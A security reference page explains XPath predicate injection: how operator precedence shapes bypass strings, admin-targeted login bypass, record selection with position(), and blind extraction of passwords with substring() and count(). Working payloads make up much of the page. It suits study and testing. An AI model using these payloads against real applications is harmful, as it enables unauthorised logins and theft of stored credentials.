---
title: "XPath predicate injection"
description: "Breaking out of a string literal inside an XPath predicate rewrites the filter condition for authentication bypass and node extraction using boolean logic and position functions."
keywords:
  - XPath predicate injection
  - XPath authentication bypass
  - or 1=1 XPath
  - position function
  - XML login bypass
---

# Predicate injection

A predicate is the bracketed filter in an XPath location step, `//user[name='x' and pass='y']`, and it is where most XPath injection lands. When user input is concatenated into the predicate, closing the string literal lets an attacker rewrite the condition that decides which nodes match.

## Breaking the literal

The query assembles a predicate around a quoted value:

```python
expr = "//user[name='" + username + "' and pass='" + password + "']"
```

Supplying a single quote in `username` ends the literal early and leaves the rest of the expression under attacker control. Operator precedence decides the payload: `and` binds tighter than `or`, so a single trailing `or '1'='1` is not enough. It parses as `name='' or ('1'='1' and pass='anything')`, which still requires the password to equal `anything`. The reliable always-true payload adds a second, standalone `or` clause that dominates the whole predicate:

```
username: ' or '1'='1' or '1'='1
password: anything
```

The expression becomes `//user[name='' or '1'='1' or '1'='1' and pass='anything']`. The middle `'1'='1'` is a top-level `or` operand, so the predicate is true no matter what the name or the trailing password clause evaluates to, and the first user node matches.

To bind to one specific account rather than whichever node sorts first, keep the username literal so its `name` clause stays enforced, and inject in the password so a re-test of `name` dominates:

```
username: admin
password: x' or name='admin
```

This yields `//user[name='admin' and pass='x' or name='admin']`. Precedence groups it as `(name='admin' and pass='x') or name='admin'`, so the admin node matches whatever its password is, and no other node does.

## Selecting by position

When the match returns the first node and the goal is a particular record, `position()` and node indexing walk the result set. This matters when the first user is not the one you want:

```
' or position()=2 or '1'='1
```

Combined with the login form, this authenticates as the second `user` node in document order. Iterating the index enumerates accounts one at a time.

## Commenting is rarely needed

XPath 1.0 has no inline comment token, so unlike SQL there is no `--` to discard the tail of the expression. Injection instead has to balance the surrounding syntax. The reliable approach is to append clauses that make the trailing quote and bracket valid, which is why the `' or 'a'='a` pattern, which leaves a well-formed string, is preferred over trying to truncate.

## Extracting nodes through the predicate

Beyond bypass, the predicate is an oracle. Boolean conditions referencing other parts of the tree confirm structure and values. The following returns a node only if a `password` child of the first user starts with `s`:

```
' or substring(//user[1]/pass,1,1)='s' or '1'='1
```

A matching response (successful login, or a returned record) confirms the guessed character; iterating the index and character set recovers the full value. The same technique reads any node reachable from the document root, not only the authentication subtree:

```
' or substring(//user[position()=1]/@role,1,1)='a' or '1'='1
```

`count()` fixes the bounds before extraction so the character-by-character walk knows how far to run:

```
' or count(//user)=5 or '1'='1
' or string-length(//user[1]/pass)=12 or '1'='1
```

## Numeric and unquoted contexts

Where input lands in a numeric predicate with no surrounding quotes, no literal break is needed; inject the logic directly:

```
//product[id=1 or 1=1]
```

payload: `1 or 1=1`.

## Tools

- **xcat**: automating boolean-based node extraction through the predicate.
- **Burp Intruder**: iterating boolean predicate payloads for blind extraction.
- Manual testing with `or`-tautology and `substring()` payloads.

## References

- [OWASP: XPATH Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
- [OWASP WSTG: Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection)
- [PayloadsAllTheThings: XPATH Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
